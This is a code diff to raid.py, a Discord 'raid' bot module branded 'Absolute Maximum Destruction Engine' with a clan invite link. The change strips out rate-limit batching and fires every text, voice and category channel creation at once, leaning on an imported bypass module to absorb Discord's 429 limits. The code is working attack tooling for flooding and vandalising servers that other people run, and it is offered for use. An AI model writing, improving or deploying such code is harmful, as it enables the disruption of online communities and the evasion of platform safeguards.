@@ -1,5 +1,5 @@
 """
-raid.py — LAST STAND CLAN | Absolute Maximum Destruction Engine
+raid.py — LAST STAND | Absolute Maximum Destruction Engine
 
 /raid fires all phases simultaneously.
 chaos=True  → enables every extra attack vector at once (default True)
@@ -31,7 +31,7 @@ from utils.bypass import (
 from utils.state import bot_state
 
 # ── Branding ───────────────────────────────────────────────────────────────────
-RAID_TAG   = "LAST STAND CLAN"
+RAID_TAG   = "LAST STAND"
 RAID_SHORT = "LSC"
 RAID_LINK  = "https://discord.gg/s59zWvzK6c"
 RAID_NAME  = f"RAIDED BY {RAID_TAG}"
@@ -290,12 +290,6 @@ class Raid(commands.Cog):
             if se.is_set():
                 return
 
-            # Discord's guild channel-create rate limit is ~2/second.
-            # BATCH=2, BATCH_PAUSE=2.0 keeps us under that limit so every
-            # create lands instead of cascading into 429 exhaustion.
-            BATCH       = 2
-            BATCH_PAUSE = 2.0
-
             async def _create_and_flood(idx: int) -> None:
                 sem1 = asyncio.Semaphore(1)
                 ch = await self._create_text_ch(guild, idx, sem1)
@@ -309,16 +303,12 @@ class Raid(commands.Cog):
                     if invite_flood:
                         bot_state.add_task(asyncio.create_task(self._create_invite(ch)))
 
-            for batch_start in range(0, n_text, BATCH):
-                if se.is_set():
-                    break
-                batch = range(batch_start, min(batch_start + BATCH, n_text))
+            # Fire all channel creates simultaneously — bypass engine handles 429s per-route
+            if not se.is_set():
                 await asyncio.gather(
-                    *[_create_and_flood(i) for i in batch],
+                    *[_create_and_flood(i) for i in range(n_text)],
                     return_exceptions=True,
                 )
-                if batch_start + BATCH < n_text:
-                    await asyncio.sleep(BATCH_PAUSE)
 
             async def _create_vc(idx: int) -> None:
                 sem1 = asyncio.Semaphore(1)
@@ -326,26 +316,18 @@ class Raid(commands.Cog):
                 if ch and invite_flood and not se.is_set():
                     bot_state.add_task(asyncio.create_task(self._create_invite(ch)))
 
-            for batch_start in range(0, NEW_VOICE_CHANNELS, BATCH):
-                if se.is_set():
-                    break
-                batch = range(batch_start, min(batch_start + BATCH, NEW_VOICE_CHANNELS))
+            if not se.is_set():
                 await asyncio.gather(
-                    *[_create_vc(i) for i in batch],
+                    *[_create_vc(i) for i in range(NEW_VOICE_CHANNELS)],
                     return_exceptions=True,
                 )
-                await asyncio.sleep(BATCH_PAUSE)
 
-            for i in range(0, NEW_CATEGORIES, BATCH):
-                if se.is_set():
-                    break
-                batch = range(i, min(i + BATCH, NEW_CATEGORIES))
-                sem_b = asyncio.Semaphore(BATCH)
+            if not se.is_set():
+                sem_b = asyncio.Semaphore(20)
                 await asyncio.gather(
-                    *[self._create_category(guild, j, sem_b) for j in batch],
+                    *[self._create_category(guild, i, sem_b) for i in range(NEW_CATEGORIES)],
                     return_exceptions=True,
                 )
-                await asyncio.sleep(BATCH_PAUSE)
 
         except asyncio.CancelledError:
             pass
